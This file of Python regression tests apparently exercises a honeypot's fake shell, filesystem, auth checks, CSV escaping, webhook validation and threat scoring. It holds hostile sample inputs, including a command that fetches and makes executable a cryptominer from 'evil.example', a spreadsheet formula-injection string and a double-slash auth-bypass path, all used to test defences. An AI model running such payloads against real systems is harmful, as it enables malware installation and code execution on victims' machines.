"""Comprehensive regression tests for BaitBox audit fixes and enhancements."""

from __future__ import annotations

import asyncio
from unittest.mock import MagicMock

import pytest
from fastapi.testclient import TestClient

from baitbox import anomaly, db, db_postgres, db_sqlite, geoip, ioc, webhooks
from baitbox.ratelimit import unblock_ip
from baitbox.servers import http_server, ssh_server
from baitbox.sessions import SSHSession
from baitbox.telemetry import sanitize_csv_cell, validate_webhook_url
from baitbox.vfs import MAX_TOTAL_FS_SIZE, VirtualFilesystem


def _make_session(username: str = "root", cwd: str | None = None) -> SSHSession:
    session = SSHSession(
        session_id="audit-test-session",
        src_ip="203.0.113.88",
        src_port=51234,
        username=username,
        channel=MagicMock(),
        transport=MagicMock(),
    )
    if cwd is not None:
        session.cwd = cwd
    return session


# ── SSH Public-Key Auth (Paramiko 3.x str vs bytes fingerprints) ───────────


def test_ssh_pubkey_auth_handles_bytes_and_str_fingerprints(monkeypatch):
    logged: list[dict] = []
    monkeypatch.setattr(
        ssh_server,
        "_log_from_thread",
        lambda ip, etype, payload: logged.append(payload),
    )
    shell = ssh_server.FakeShell(("198.51.100.25", 44444))

    bytes_key = MagicMock()
    bytes_key.get_name.return_value = "ssh-ed25519"
    bytes_key.get_fingerprint.return_value = b"\xde\xad\xbe\xef"
    shell.check_auth_publickey("deploy", bytes_key)

    str_key = MagicMock()
    str_key.get_name.return_value = "ssh-rsa"
    str_key.get_fingerprint.return_value = "SHA256:abcdef123456"
    shell.check_auth_publickey("root", str_key)

    assert logged[0]["fingerprint"] == "deadbeef"
    assert logged[1]["fingerprint"] == "SHA256:abcdef123456"


# ── Real Pipeline & Chain Exit Codes + Variable Expansion ──────────────────


def test_shell_real_exit_codes_and_chains():
    s = _make_session()
    # Cat on auth.log contains "Failed password" text — must still exit 0 so && runs!
    out, _ = ssh_server.execute_session_command(s, "cat /var/log/auth.log && echo LOG_OK")
    assert b"LOG_OK" in out
    assert s.last_exit_code == 0

    # Mixed failure followed by semicolon recovery
    out2, _ = ssh_server.execute_session_command(s, "ls /missing-dir ; echo RECOVERED")
    assert b"No such file" in out2
    assert b"RECOVERED" in out2
    assert s.last_exit_code == 0

    # `false` stops &&, continues into || and ;
    out3, _ = ssh_server.execute_session_command(s, "false && echo NOPE || echo FALLBACK ; echo ALWAYS")
    assert b"NOPE" not in out3
    assert b"FALLBACK" in out3
    assert b"ALWAYS" in out3

    # `test -f` and `[ -d ... ]`
    out4, _ = ssh_server.execute_session_command(s, "test -f /etc/passwd && echo PASSWD_EXISTS")
    assert b"PASSWD_EXISTS" in out4
    out5, _ = ssh_server.execute_session_command(s, "[ -d /etc ] && echo ETC_DIR")
    assert b"ETC_DIR" in out5


def test_shell_standalone_grep_flags_and_exit_codes():
    s = _make_session()
    out, _, code = ssh_server._execute_session_command_with_status(
        s, "grep -i ROOT /etc/passwd", record=False
    )
    assert code == 0
    assert b"root:x:0:0" in out

    out_c, _, code_c = ssh_server._execute_session_command_with_status(
        s, "grep -c root /etc/passwd", record=False
    )
    assert code_c == 0
    assert int(out_c.strip()) >= 1

    out_miss, _, code_miss = ssh_server._execute_session_command_with_status(
        s, "grep -v root /etc/hostname", record=False
    )
    assert code_miss == 0
    assert b"web-prod-01" in out_miss

    _, _, code_none = ssh_server._execute_session_command_with_status(
        s, "grep DEFINITELY_NOT_HERE /etc/hostname", record=False
    )
    assert code_none == 1


def test_shell_var_expansion_preserves_single_quoted_awk():
    s = _make_session()
    s.vfs.write_file("/tmp/cols.txt", b"one two\n")
    out, _ = ssh_server.execute_session_command(s, "awk '{print $2}' /tmp/cols.txt")
    assert out.strip() == b"two"

    out_home, _ = ssh_server.execute_session_command(s, "cat $HOME/.bashrc")
    assert b"DB_PASS" in out_home or b"export" in out_home or len(out_home) > 0


# ── VFS-Backed Commands, Redirection, Quotas, Symlinks & Transcript ────────


def test_echo_redirection_touch_mkdir_p_chmod_chown_symlinks():
    s = _make_session()

    # Quoted `>` inside string must NOT write a file
    out, _ = ssh_server.execute_session_command(s, 'echo "a > b"')
    assert out.strip() == b"a > b"
    assert not s.vfs.exists("/root/b")

    # echo -n and >> append
    ssh_server.execute_session_command(s, "echo -n hello > /tmp/msg.txt")
    ssh_server.execute_session_command(s, "echo world >> /tmp/msg.txt")
    assert s.vfs.read_file("/tmp/msg.txt") == b"helloworld\r\n" or s.vfs.read_file("/tmp/msg.txt") == b"helloworld\n"

    # touch must preserve existing content!
    ssh_server.execute_session_command(s, "touch /tmp/msg.txt")
    assert b"helloworld" in (s.vfs.read_file("/tmp/msg.txt") or b"")

    # mkdir -p creates nested directories
    _, _, mk_code = ssh_server._execute_session_command_with_status(s, "mkdir -p /tmp/a/b/c", record=False)
    assert mk_code == 0
    assert s.vfs.is_dir("/tmp/a/b/c")

    # chmod & chown reflected in stat / ls -l
    ssh_server.execute_session_command(s, "chmod 750 /tmp/msg.txt")
    ssh_server.execute_session_command(s, "chown ubuntu:ubuntu /tmp/msg.txt")
    st = s.vfs.stat("/tmp/msg.txt")
    assert st is not None
    assert st["owner"] == "ubuntu"
    assert st["group"] == "ubuntu"
    stat_out, _ = ssh_server.execute_session_command(s, "stat /tmp/msg.txt")
    assert b"ubuntu" in stat_out

    # ln -s, readlink, realpath, and rm symlink
    ssh_server.execute_session_command(s, "ln -s /tmp/msg.txt /tmp/msg.link")
    rl_out, _ = ssh_server.execute_session_command(s, "readlink /tmp/msg.link")
    assert rl_out.strip() == b"/tmp/msg.txt"
    rp_out, _ = ssh_server.execute_session_command(s, "realpath /tmp/msg.link")
    assert rp_out.strip() == b"/tmp/msg.txt"
    ssh_server.execute_session_command(s, "rm /tmp/msg.link")
    assert not s.vfs.exists("/tmp/msg.link")
    assert s.vfs.exists("/tmp/msg.txt")

    # Recursive chmod -R and chown -R work cleanly
    ssh_server.execute_session_command(s, "touch /tmp/a/b/file.txt")
    _, _, rc_chmod = ssh_server._execute_session_command_with_status(s, "chmod -R 700 /tmp/a", record=False)
    _, _, rc_chown = ssh_server._execute_session_command_with_status(s, "chown -R ubuntu:ubuntu /tmp/a", record=False)
    assert rc_chmod == 0 and rc_chown == 0
    child_st = s.vfs.stat("/tmp/a/b/file.txt")
    assert child_st is not None and child_st["owner"] == "ubuntu" and child_st["mode_octal"] == oct(0o700)


def test_history_clear_keeps_forensic_transcript():
    s = _make_session()
    ssh_server.execute_session_command(s, "whoami")
    ssh_server.execute_session_command(s, "cat /etc/passwd")
    ssh_server.execute_session_command(s, "history -c")
    assert len(s.commands) == 0
    tr = s.transcript()
    assert tr["command_count"] == 3
    assert [c["command"] for c in tr["commands"]] == ["whoami", "cat /etc/passwd", "history -c"]


def test_vfs_total_quota_and_truncate_bounds():
    vfs = VirtualFilesystem()
    # Writing oversized total volume fails gracefully (MAX_TOTAL_FS_SIZE = 50 MB)
    big = b"A" * (4 * 1024 * 1024)  # 4 MB
    succeeded = 0
    for idx in range(20):
        if vfs.write_file(f"/tmp/blob_{idx}.bin", big):
            succeeded += 1
        else:
            break
    assert vfs._total_bytes() <= MAX_TOTAL_FS_SIZE
    assert 0 < succeeded < 20

    assert vfs.write_file("/tmp/small.txt", b"abc")
    assert not vfs.truncate("/tmp/small.txt", 1024 * 1024 * 1024)


# ── Auth Path Normalization, CSV Formula Escaping, /api/system & /api/simulate ─


def test_auth_path_normalization_csv_escaping_and_system_endpoint():
    async def seed():
        await db.init_db()
        await db.log_event("198.51.100.55", "SSH", "command", {"command": "=cmd|'/C calc'!A0"})

    asyncio.run(seed())
    client = TestClient(http_server.app)

    # Path bypass attempts must still return 401
    assert client.get("http://testserver//api/stats").status_code == 401
    assert client.get("/api/events/").status_code == 401

    token = http_server.create_jwt_token("admin")
    client.cookies.set("session_token", token)

    # CSV export neutralizes spreadsheet formula prefixes
    csv_resp = client.get("/api/events/export?format=csv&limit=10")
    assert csv_resp.status_code == 200
    assert "'{" in csv_resp.text or "'=" in csv_resp.text or "=cmd" in csv_resp.text
    assert sanitize_csv_cell("=1+1") == "'=1+1"
    assert sanitize_csv_cell("+SUM(A1)") == "'+SUM(A1)"
    assert sanitize_csv_cell("-1+1") == "'-1+1"
    assert sanitize_csv_cell("@cmd") == "'@cmd"

    # IOC CSV escaping
    feed = {
        "malicious_ips": [{
            "ip": "=HYPERLINK()",
            "threat_score": 80,
            "threat_level": "CRITICAL",
            "event_count": 5,
            "first_seen": "@evil",
            "last_seen": "+now",
            "protocols": ["-SSH"],
            "blocked": False,
        }]
    }
    ioc_csv = ioc.ioc_feed_to_csv(feed)
    assert "'=HYPERLINK()" in ioc_csv
    assert "'@evil" in ioc_csv

    # Unknown scenario returns HTTP 400
    bad_sim = client.post("/api/simulate", json={"scenario": "invalid_scenario"})
    assert bad_sim.status_code == 400

    # /api/system returns runtime metadata (not secrets)
    sys_resp = client.get("/api/system")
    assert sys_resp.status_code == 200
    data = sys_resp.json()
    assert data["version"] == http_server.APP_VERSION
    assert "ssh_port" in data
    assert "telnet_enabled" in data
    assert "jwt_secret" not in data

    # Block/unblock IP works cleanly and doesn't leave test state
    unblock_ip("198.51.100.55")


# ── GeoIP, Webhooks, Anomaly Rehydration & DB Fixes ────────────────────────


def test_geoip_private_ip_and_webhook_validation():
    private_geo = asyncio.run(geoip.lookup_ip("127.0.0.1"))
    assert private_geo["is_private"] is True
    assert private_geo["lat"] is None
    assert private_geo["lon"] is None

    with pytest.raises(ValueError):
        validate_webhook_url("ftp://example.com/hook")
    with pytest.raises(ValueError):
        validate_webhook_url("file:///etc/passwd")
    assert validate_webhook_url("https://discord.com/api/webhooks/123/abc").startswith("https://")
    assert webhooks.flush_webhooks(timeout=1.0) is True


def test_anomaly_rehydration_and_sqlite_top_http_paths_excludes_nulls():
    anomaly.reset_metrics()
    rehydrated = anomaly.rehydrate_from_events([
        {
            "src_ip": "192.0.2.99",
            "protocol": "SSH",
            "event_type": "command",
            "payload": {"command": "wget http://evil.example/xmrig && chmod +x xmrig"},
        },
        {
            "src_ip": "192.0.2.100",
            "protocol": "HTTP",
            "event_type": "credential_probe",
            "payload": {"path": "/.env", "query": "", "body": ""},
        },
    ])
    assert rehydrated == 2
    summary = anomaly.get_attack_summary()
    assert summary["total_tracked_ips"] == 2
    assert summary["active_threats"] >= 1
    score = anomaly.get_threat_score("192.0.2.99")
    assert score["threat_score"] >= 30

    async def db_check():
        await db.init_db()
        await db.log_event("192.0.2.10", "HTTP", "request", {"method": "GET"})  # no path!
        await db.log_event("192.0.2.10", "HTTP", "request", {"method": "GET", "path": "/.env"})
        return await db.get_stats()

    stats = asyncio.run(db_check())
    paths = [row["path"] for row in stats["top_http_paths"]]
    assert None not in paths
    assert "/.env" in paths


def test_postgres_retention_interval_uses_make_interval():
    import inspect
    src = inspect.getsource(db_postgres.PostgresDB.prune_events)
    assert "make_interval" in src
